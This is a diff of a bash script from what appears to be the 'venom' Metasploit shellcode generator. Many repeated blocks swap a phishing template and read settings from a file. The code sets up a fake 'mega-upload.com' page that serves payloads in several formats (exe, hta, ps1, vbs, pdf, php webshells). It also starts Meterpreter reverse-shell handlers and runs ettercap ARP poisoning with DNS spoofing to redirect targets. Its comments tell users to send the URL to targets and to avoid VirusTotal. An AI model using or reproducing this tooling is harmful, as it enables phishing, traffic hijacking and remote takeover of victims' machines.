@@ -72,45 +72,16 @@ InJEc16="$IPATH/templates/exec.jar" # jar script path
 
 
 
-# ------------------------------------------------------------------------
-# CHOSE TO USE DEFAULT SETTINGS OR 'VENOM.CONF' SETTINGS
-# ------------------------------------------------------------------------
-if [ -e aux/venom.conf ]; then
-conf="venom"
-D3F=`cat $IPATH/aux/venom.conf | egrep -m 1 "APACHE_DEFAULT" | cut -d '=' -f2` > /dev/null 2>&1
-ApAcHe=`cat $IPATH/aux/venom.conf | egrep -m 1 "APACHE_WEBROOT" | cut -d '=' -f2` > /dev/null 2>&1
-DrIvC=`cat $IPATH/aux/venom.conf | egrep -m 1 "WINE_DRIVEC" | cut -d '=' -f2` > /dev/null 2>&1
-MiG=`cat $IPATH/aux/fast_migrate.rc | grep "migrate" | awk {'print $4'}` > /dev/null 2>&1
 
-else
-
-  if [ "$DiStR0" = "Ubuntu" ]; then
-    ApAcHe="/var/www"
-    elif [ "$DiStR0" = "Kali" ]; then
-    ApAcHe="/var/www/html"
-    elif [ "$DiStR0" = "BackBox" ]; then
-    ApAcHe="/var/www/html"
-  else
-    ApAcHe="/var/www/html"
-  fi
-
-# default settings
-conf="default"
-DrIvC="$H0m3/.wine/drive_c" # wine drive_c path
-fi
-
-
-
-
-
-# --------------------------------------------
-# check for the existance of venom domain name
-# --------------------------------------------
-if [ -d aux/public_html ]; then
-D0M4IN="yes"
-else
-D0M4IN="no"
-fi
+# -------------------------------------------
+# SETTINGS FILE FUNTION (venom-main/settings)
+# -------------------------------------------
+ChEk=`cat settings | egrep -m 1 "MSF_REBUILD" | cut -d '=' -f2` > /dev/null 2>&1
+MsFu=`cat settings | egrep -m 1 "MSF_UPDATE" | cut -d '=' -f2` > /dev/null 2>&1
+D3F=`cat settings | egrep -m 1 "APACHE_DEFAULT" | cut -d '=' -f2` > /dev/null 2>&1
+ApAcHe=`cat settings | egrep -m 1 "APACHE_WEBROOT" | cut -d '=' -f2` > /dev/null 2>&1
+D0M4IN=`cat settings | egrep -m 1 "MEGAUPLOAD_DOMAIN" | cut -d '=' -f2` > /dev/null 2>&1
+DrIvC=`cat settings | egrep -m 1 "WINE_DRIVEC" | cut -d '=' -f2` > /dev/null 2>&1
 
 
 
@@ -118,7 +89,7 @@ fi
 # -----------------------------------------
 # msf postgresql database connection check?
 # -----------------------------------------
-
+if [ "$ChEk" = "ON" ]; then
 cat << !
     ╔─────────────────────────────────────────────────╗
     |  postgresql metasploit database connection fix  |
@@ -146,6 +117,18 @@ cat << !
     echo "[✔] postgresql connected to msf .."
     sleep 3
   fi
+fi
+
+
+
+
+# -----------------------------------------------
+# update metasploit database before running tool?
+# -----------------------------------------------
+if [ "$MsFu" = "ON" ]; then
+  xterm -T " UPDATING DATABASE " -geometry 110x23 -e "msfconsole -x 'msfupdate; exit -y' && sleep 2"
+fi
+
 
 
 
@@ -461,9 +444,9 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m $D3F/$N4m
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
@@ -472,7 +455,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -674,9 +657,9 @@ fi
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m2|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m2|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m2 $D3F/$N4m2
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
@@ -685,7 +668,7 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -834,9 +817,9 @@ fi
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m2|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m2|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m2 $D3F/$N4m2
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
@@ -845,7 +828,7 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -1228,9 +1211,9 @@ fi
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m.exe $D3F/$N4m.exe
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
@@ -1239,7 +1222,7 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -1442,9 +1425,9 @@ fi
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m.exe $D3F/$N4m.exe
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
@@ -1453,7 +1436,7 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -1595,9 +1578,9 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.rb|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m.rb|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m.rb $D3F/$N4m.rb
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
@@ -1605,7 +1588,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -1764,9 +1747,9 @@ fi
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m2|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m2|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m2 $D3F/$N4m2
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
@@ -1775,7 +1758,7 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -1972,9 +1955,9 @@ fi
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.bat|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m.bat|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m.bat $D3F/$N4m.bat
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
@@ -1983,7 +1966,7 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -2141,9 +2124,9 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.hta|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m.hta|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m.hta $D3F/$N4m.hta
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
@@ -2152,7 +2135,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -2300,9 +2283,9 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.ps1|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m.ps1|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m.ps1 $D3F/$N4m.ps1
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
@@ -2311,7 +2294,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -2486,9 +2469,9 @@ fi
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.bat|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m.bat|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m.bat $D3F/$N4m.bat
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
@@ -2497,7 +2480,7 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -2604,9 +2587,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "PAYLOAD STORE
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.vbs|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m.vbs|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m.vbs $D3F/$N4m.vbs
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
@@ -2614,7 +2597,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "PAYLOAD STORE
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -2795,9 +2778,9 @@ fi
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.vbs|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m.vbs|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m.vbs $D3F/$N4m.vbs
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
@@ -2806,7 +2789,7 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -3020,9 +3003,9 @@ fi
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.pdf|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m.pdf|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m.pdf $D3F/$N4m.pdf
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
@@ -3031,7 +3014,7 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -3155,9 +3138,9 @@ fi
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.pdf|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m.pdf|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m.pdf $D3F/$N4m.pdf
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
@@ -3166,7 +3149,7 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -3292,9 +3275,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
         # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.php|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        sed "s|NaM3|$N4m.php|" $IPATH/templates/phishing/mega.html > $D3F/index.html
         cp $IPATH/output/$N4m.php $D3F/$N4m.php
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
@@ -3302,7 +3285,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
@@ -3426,9 +3409,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
-        if [ "$D0M4IN" = "yes" ]; then
+        if [ "$D0M4IN" = "YES" ]; then
